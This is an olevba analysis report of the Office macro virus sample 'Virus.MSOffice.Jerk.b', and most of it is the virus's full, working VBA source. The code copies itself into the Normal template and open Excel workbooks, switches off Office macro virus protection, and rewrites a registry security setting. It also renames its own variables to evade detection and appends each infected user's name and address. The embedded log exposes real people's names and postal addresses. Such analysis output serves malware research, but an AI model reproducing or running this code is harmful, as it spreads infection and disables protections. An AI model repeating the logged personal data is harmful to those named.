olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.b-6d0f1c97e3522ab202752b8df0c0f8bd82b95422
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.b-6d0f1c97e3522ab202752b8df0c0f8bd82b95422 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Workbook_Deactivate()
On Error Resume Next
Const KZEHLIVFFVEAT = 1, IWTWSDAW = True, QQDQRWTE = False, ZZAOXES = 0
Dim FREYCVSVHA, OIJGVUPUOVAFSJ As String
Dim QXZAILPS, APVOMAHAPDVBR As Integer
Dim KZXRWAPM As Boolean
OIJGVUPUOVAFSJ = "ThisWorkbook"
FREYCVSVHA = Application.ThisWorkbook.VBProject.VBComponents.Item(KZEHLIVFFVEAT).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(KZEHLIVFFVEAT).CodeModule.CountOfLines)
Call FGPTLDDVS(FREYCVSVHA)
For QXZAILPS = KZEHLIVFFVEAT To Application.Workbooks.Count
KZXRWAPM = QQDQRWTE
For APVOMAHAPDVBR = KZEHLIVFFVEAT To Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Count
If Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Item(APVOMAHAPDVBR).CodeModule.CountOfLines = ZZAOXES Then
If Application.Workbooks.Item(QXZAILPS).Path <> "" And Application.Workbooks.Item(QXZAILPS).Saved = IWTWSDAW And KZXRWAPM = QQDQRWTE Then KZXRWAPM = IWTWSDAW
Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Item(APVOMAHAPDVBR).CodeModule.InsertLines KZEHLIVFFVEAT, FREYCVSVHA
If Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Item(APVOMAHAPDVBR).Name = OIJGVUPUOVAFSJ Then
Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Item(APVOMAHAPDVBR).CodeModule.ReplaceLine KZEHLIVFFVEAT * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Item(APVOMAHAPDVBR).CodeModule.ReplaceLine KZEHLIVFFVEAT * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next APVOMAHAPDVBR
If KZXRWAPM = IWTWSDAW Then Application.Workbooks.Item(QXZAILPS).Save
Next QXZAILPS
End Sub
Private Sub Document_Close()
On Error Resume Next
Const IWTWSDAW = True, QQDQRWTE = False, ZZAOXES = 0, KZEHLIVFFVEAT = 1, YKFYDQDONY = wdFormatDocument, QTIEMAE = wdFormatTemplate, VECKNUCCYMMVHDW = ":"
Dim KZXRWAPM, JNBNZQ, JYLTH, JIZPPSVBC As Boolean
Dim KLYHODSTFLI, FWAAMTQQJZEF As Object
Dim VPNSJTYBMFRYZ, FREYCVSVHA As String
If Month(KZEHLIVFFVEAT * Now) > KZEHLIVFFVEAT * 2 + KZEHLIVFFVEAT * 3 And Day(KZEHLIVFFVEAT * Now) = 4 + KZEHLIVFFVEAT * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set KLYHODSTFLI = ActiveDocument.VBProject.VBComponents.Item(KZEHLIVFFVEAT)
Set FWAAMTQQJZEF = NormalTemplate.VBProject.VBComponents.Item(KZEHLIVFFVEAT)
Randomize
JYLTH = QQDQRWTE
JIZPPSVBC = QQDQRWTE
If KLYHODSTFLI.CodeModule.CountOfLines <> ZZAOXES Then JYLTH = IWTWSDAW
If FWAAMTQQJZEF.CodeModule.CountOfLines <> ZZAOXES Then JIZPPSVBC = IWTWSDAW
Options.VirusProtection = QQDQRWTE
If (JYLTH = IWTWSDAW Xor JIZPPSVBC = IWTWSDAW) And (ActiveDocument.SaveFormat = YKFYDQDONY Or ActiveDocument.SaveFormat = QTIEMAE) Then
If JYLTH = IWTWSDAW Then
JNBNZQ = NormalTemplate.Saved
FREYCVSVHA = KLYHODSTFLI.CodeModule.Lines(KZEHLIVFFVEAT, KLYHODSTFLI.CodeModule.CountOfLines)
Call HNPZILDSI(FREYCVSVHA)
If Int(Rnd * 10 * KZEHLIVFFVEAT) = KZEHLIVFFVEAT * 7 Then Call HEXPGMW(FREYCVSVHA)
Call CRDHUAZG(FREYCVSVHA)
FWAAMTQQJZEF.CodeModule.InsertLines KZEHLIVFFVEAT, FREYCVSVHA
If JNBNZQ = IWTWSDAW Then NormalTemplate.Save
End If
VPNSJTYBMFRYZ = Mid(ActiveDocument.FullName, 2, KZEHLIVFFVEAT)
If JIZPPSVBC = IWTWSDAW And (VPNSJTYBMFRYZ = VECKNUCCYMMVHDW Or ActiveDocument.Saved = QQDQRWTE) Then
KZXRWAPM = ActiveDocument.Saved
FREYCVSVHA = FWAAMTQQJZEF.CodeModule.Lines(KZEHLIVFFVEAT, FWAAMTQQJZEF.CodeModule.CountOfLines)
Call CRDHUAZG(FREYCVSVHA)
KLYHODSTFLI.CodeModule.InsertLines KZEHLIVFFVEAT, FREYCVSVHA
If KZXRWAPM = IWTWSDAW Then ActiveDocument.Save
End If
End If
End Sub
Private Sub HEXPGMW(ByRef FREYCVSVHA As String)
On Error Resume Next
Const WSGBJP = 48, JIZNOWER = 15, UDZVIOS = 5, ZQRTEPHJHYSJXH = 65, GLDHJ = 90, KZEHLIVFFVEAT = 1, IWTWSDAW = True, QQDQRWTE = False
Dim OHVUJTAWOKUU, LVLSFWMJEJCHFTmp, TSMBOTJMKAIK, LVLSFWMJEJCHF(KZEHLIVFFVEAT To WSGBJP), LVLSFWMJEJCHF2(KZEHLIVFFVEAT To WSGBJP) As String
Dim QXZAILPS, APVOMAHAPDVBR, RCGIKKDKCVT As Integer
Dim SMMFTXPZ As Boolean
OHVUJTAWOKUU = "FREYCVSVHA WSGBJP LVLSFWMJEJCHF LVLSFWMJEJCHF2 TSMBOTJMKAIK QXZAILPS APVOMAHAPDVBR RCGIKKDKCVT SMMFTXPZ HEXPGMW JIZNOWER UDZVIOS ZQRTEPHJHYSJXH GLDHJ KZEHLIVFFVEAT OHVUJTAWOKUU LVLSFWMJEJCHFTmp KZXRWAPM JNBNZQ JYLTH JIZPPSVBC KLYHODSTFLI FWAAMTQQJZEF HNPZILDSI NSCMLHVHFSRWTN LVUUQ XYXNGIVZO GTCQWLOUXXTAFE NSCMLHVHFSRWTNTmp FYFDOKNIYSKKT DQDEKXE VPNSJTYBMFRYZ IWTWSDAW QQDQRWTE ZZAOXES YKFYDQDONY QTIEMAE PITXSPDGJQFAP YXTZELWRELBV VECKNUCCYMMVHDW JTOOTJUCVFZFMJO UDRNZGLXVAKQCS OIJGVUPUOVAFSJ FGPTLDDVS CRDHUAZG VPLBLISZR JCFBFV HXAKCNGXL"
Randomize
APVOMAHAPDVBR = KZEHLIVFFVEAT
For QXZAILPS = KZEHLIVFFVEAT To Len(OHVUJTAWOKUU)
If Mid(OHVUJTAWOKUU, QXZAILPS, KZEHLIVFFVEAT) = " " Or QXZAILPS = Len(OHVUJTAWOKUU) Then
If QXZAILPS = Len(OHVUJTAWOKUU) Then LVLSFWMJEJCHFTmp = LVLSFWMJEJCHFTmp & Mid(OHVUJTAWOKUU, QXZAILPS, KZEHLIVFFVEAT)
For RCGIKKDKCVT = KZEHLIVFFVEAT To Int((JIZNOWER - UDZVIOS + KZEHLIVFFVEAT) * Rnd + UDZVIOS)
LVLSFWMJEJCHF2(APVOMAHAPDVBR) = LVLSFWMJEJCHF2(APVOMAHAPDVBR) & Chr(Int((GLDHJ - ZQRTEPHJHYSJXH + KZEHLIVFFVEAT) * Rnd + ZQRTEPHJHYSJXH))
Next RCGIKKDKCVT
LVLSFWMJEJCHF(APVOMAHAPDVBR) = LVLSFWMJEJCHFTmp
LVLSFWMJEJCHFTmp = ""
APVOMAHAPDVBR = APVOMAHAPDVBR + KZEHLIVFFVEAT
Else
LVLSFWMJEJCHFTmp = LVLSFWMJEJCHFTmp & Mid(OHVUJTAWOKUU, QXZAILPS, KZEHLIVFFVEAT)
End If
Next QXZAILPS
SMMFTXPZ = QQDQRWTE
For QXZAILPS = KZEHLIVFFVEAT To Len(FREYCVSVHA)
For APVOMAHAPDVBR = KZEHLIVFFVEAT To WSGBJP
If Mid(FREYCVSVHA, QXZAILPS, Len(LVLSFWMJEJCHF(APVOMAHAPDVBR))) = LVLSFWMJEJCHF(APVOMAHAPDVBR) Then
TSMBOTJMKAIK = TSMBOTJMKAIK & LVLSFWMJEJCHF2(APVOMAHAPDVBR)
QXZAILPS = QXZAILPS + Len(LVLSFWMJEJCHF(APVOMAHAPDVBR)) - KZEHLIVFFVEAT
SMMFTXPZ = IWTWSDAW
Exit For
End If
Next APVOMAHAPDVBR
If SMMFTXPZ = QQDQRWTE Then
TSMBOTJMKAIK = TSMBOTJMKAIK & Mid(FREYCVSVHA, QXZAILPS, KZEHLIVFFVEAT)
Else
SMMFTXPZ = QQDQRWTE
End If
Next QXZAILPS
FREYCVSVHA = TSMBOTJMKAIK
End Sub
Private Sub HNPZILDSI(ByRef FREYCVSVHA As String)
On Error Resume Next
Const GTCQWLOUXXTAFE = "' ", KZEHLIVFFVEAT = 1
Const PITXSPDGJQFAP = "hh:mm:ss: AMPM - ", YXTZELWRELBV = "dddd, d mmm yyyy"
Dim NSCMLHVHFSRWTNTmp, NSCMLHVHFSRWTN, FYFDOKNIYSKKT, DQDEKXE, LVUUQ, XYXNGIVZO As String
Dim QXZAILPS As Integer
LVUUQ = Chr(10 * KZEHLIVFFVEAT + 3)
NSCMLHVHFSRWTN = Application.UserAddress
DQDEKXE = Format(Time, PITXSPDGJQFAP) & Format(Date, YXTZELWRELBV)
XYXNGIVZO = Chr(KZEHLIVFFVEAT * 10)
FYFDOKNIYSKKT = Application.UserName
For QXZAILPS = KZEHLIVFFVEAT To Len(NSCMLHVHFSRWTN)
If Mid(NSCMLHVHFSRWTN, QXZAILPS, KZEHLIVFFVEAT) <> LVUUQ Then
If Mid(NSCMLHVHFSRWTN, QXZAILPS, KZEHLIVFFVEAT) <> XYXNGIVZO Then
NSCMLHVHFSRWTNTmp = NSCMLHVHFSRWTNTmp & Mid(NSCMLHVHFSRWTN, QXZAILPS, KZEHLIVFFVEAT)
End If
Else
NSCMLHVHFSRWTNTmp = NSCMLHVHFSRWTNTmp & LVUUQ & GTCQWLOUXXTAFE
End If
Next QXZAILPS
FREYCVSVHA = FREYCVSVHA & LVUUQ & GTCQWLOUXXTAFE & DQDEKXE & LVUUQ & GTCQWLOUXXTAFE & FYFDOKNIYSKKT & LVUUQ & GTCQWLOUXXTAFE & NSCMLHVHFSRWTN & LVUUQ
End Sub
Private Sub CRDHUAZG(ByVal FREYCVSVHA As String)
On Error Resume Next
Dim HXAKCNGXL As Long
Dim JTOOTJUCVFZFMJO As Object
Dim VPLBLISZR, JCFBFV As String
VPLBLISZR = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
HXAKCNGXL = &H0
JCFBFV = "Options6"
System.PrivateProfileString("", VPLBLISZR, JCFBFV) = HXAKCNGXL
Set JTOOTJUCVFZFMJO = GetObject(, "Excel.Application")
Const KZEHLIVFFVEAT = 1, ZZAOXES = 0
Dim OIJGVUPUOVAFSJ As String
Dim QXZAILPS, APVOMAHAPDVBR As Integer
OIJGVUPUOVAFSJ = "ThisWorkbook"
For QXZAILPS = KZEHLIVFFVEAT To JTOOTJUCVFZFMJO.Application.Workbooks.Count
For APVOMAHAPDVBR = KZEHLIVFFVEAT To JTOOTJUCVFZFMJO.Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Count
If JTOOTJUCVFZFMJO.Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Item(APVOMAHAPDVBR).CodeModule.CountOfLines = ZZAOXES Then
JTOOTJUCVFZFMJO.Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Item(APVOMAHAPDVBR).CodeModule.InsertLines KZEHLIVFFVEAT, FREYCVSVHA
If JTOOTJUCVFZFMJO.Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Item(APVOMAHAPDVBR).Name = OIJGVUPUOVAFSJ Then
JTOOTJUCVFZFMJO.Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Item(APVOMAHAPDVBR).CodeModule.ReplaceLine 33 * KZEHLIVFFVEAT, "Private Sub Workbook_Deactivate()"
Else
JTOOTJUCVFZFMJO.Application.Workbooks.Item(QXZAILPS).VBProject.VBComponents.Item(APVOMAHAPDVBR).CodeModule.ReplaceLine KZEHLIVFFVEAT * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next APVOMAHAPDVBR
Next QXZAILPS
Set JTOOTJUCVFZFMJO = Nothing
End Sub
Private Sub FGPTLDDVS(ByVal FREYCVSVHA As String)
On Error Resume Next
Const IWTWSDAW = True, QQDQRWTE = False, KZEHLIVFFVEAT = 1, ZZAOXES = 0
Dim UDRNZGLXVAKQCS As Object
Dim JNBNZQ As Boolean
Set UDRNZGLXVAKQCS = GetObject(, "Word.Application")
If UDRNZGLXVAKQCS.NormalTemplate.VBProject.VBComponents.Item(KZEHLIVFFVEAT).CodeModule.CountOfLines = ZZAOXES Then
JNBNZQ = UDRNZGLXVAKQCS.NormalTemplate.Saved
UDRNZGLXVAKQCS.Options.VirusProtection = QQDQRWTE
UDRNZGLXVAKQCS.NormalTemplate.VBProject.VBComponents.Item(KZEHLIVFFVEAT).CodeModule.InsertLines KZEHLIVFFVEAT, FREYCVSVHA
If JNBNZQ = IWTWSDAW Then UDRNZGLXVAKQCS.NormalTemplate.Save
End If
Set UDRNZGLXVAKQCS = Nothing
End Sub

' 09:50:58:  - Saturday, 13 Apr 1997
' Fred Cohen
' fc@all.net

' 01:50:20:  - torsdag, 4 mar 1999
' Miroslaw Przybycien
'

' 09:19:15:  - środa, 17 mar 1999
' Joanna Skałuba
' People meet People
Kancelaria Doradcza
ul.Zakręt 18
60-351 Poznań

' 12:34:41:  - wtorek, 8 cze 1999
' AWF POZNAŃ
' Akademia Wychowania Fizycznego
im.Eugeniusza Piaseckiego
Instytut Rehabilitacji
Zakład Kinezyterapii
ul.Królowej Jadwigi

' 01:35:41:  - środa, 15 gru 1999
' Andrzej Sękowski
' Prof. dr hab. Andrzej Sękowski
Redaktor Naczelny Przeglądu Psychologicznego
Aleje Racławickie 14
20-950 Lublin

' 11:44:08:  - czwartek, 27 sty 2000
' My Wszyscy
'

' 12:20:13:  - sobota, 29 sty 2000
' moles
'

' 11:47:45:  - środa, 16 lut 2000
' AGNIESZKA KULIK
'

' 03:45:41:  - poniedziałek, 10 kwi 2000
' szymona
' Instytut Psychologii
Katolicki Uniwersytet Lubelski
Al.Racławickie 14
20-950 Lublin

' 01:40:34:  - czwartek, 8 cze 2000
' Robert Mackiewicz
'

' 02:29:28:  - piątek, 23 cze 2000
' Darek Fijołek
'

' 09:49:46:  - poniedziałek, 28 sie 2000
' steuden
'

' 01:17:50:  - czwartek, 14 gru 2000
' bernek
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

